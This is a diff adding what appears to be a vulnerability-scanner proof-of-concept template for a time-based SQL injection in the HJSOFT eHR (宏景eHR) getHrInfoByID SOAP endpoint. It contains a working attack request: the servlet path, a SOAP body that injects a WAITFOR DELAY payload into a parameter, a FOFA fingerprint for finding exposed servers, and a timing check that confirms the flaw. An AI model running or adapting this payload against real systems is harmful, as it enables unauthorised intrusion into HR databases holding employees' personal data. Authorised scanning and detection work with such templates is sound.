@@ -1,0 +1,27 @@
+id: poc-yaml-hjsoft-ehr-gethrinfobyid-sqli
+info:
+  name: 宏景eHR getHrInfoByID SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 宏景eHR
+  fofa: app="HJSOFT-HCM"
+variables:
+  t1: random_int(5,10)
+  t2: t1 + 2
+requests:
+- method: POST
+  path: /servlet/XFireServlet/HrpService
+  headers:
+    Content-Type: application/xml
+    SOAPAction: '""'
+  data: "<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\"\
+    \ xmlns:hrp=\"http://www.hjsj.com/HrpService\">\n   <soapenv:Header/>\n   <soapenv:Body>\n\
+    \      <hrp:getHrInfoByID>\n         <hrp:in0>1</hrp:in0>\n         <hrp:in1>1'WAITFOR\
+    \ DELAY '0:0:{{.t1}}</hrp:in1>\n         <hrp:in2>1</hrp:in2>\n         <hrp:in3>1</hrp:in3>\n\
+    \         <hrp:in4>1</hrp:in4>\n         <hrp:in5>1</hrp:in5>\n         <hrp:in6>1</hrp:in6>\n\
+    \      </hrp:getHrInfoByID>\n   </soapenv:Body>\n</soapenv:Envelope>"
+  expression: status_code == 200 && contains(body,"HrpService") && contains(body,"getHrInfoByIDResponse")
+    && contains(body,"传入的KEY值有错误") && contains(content_type,"text/xml") && duration
+    > t1 && duration < t2
+transport: http
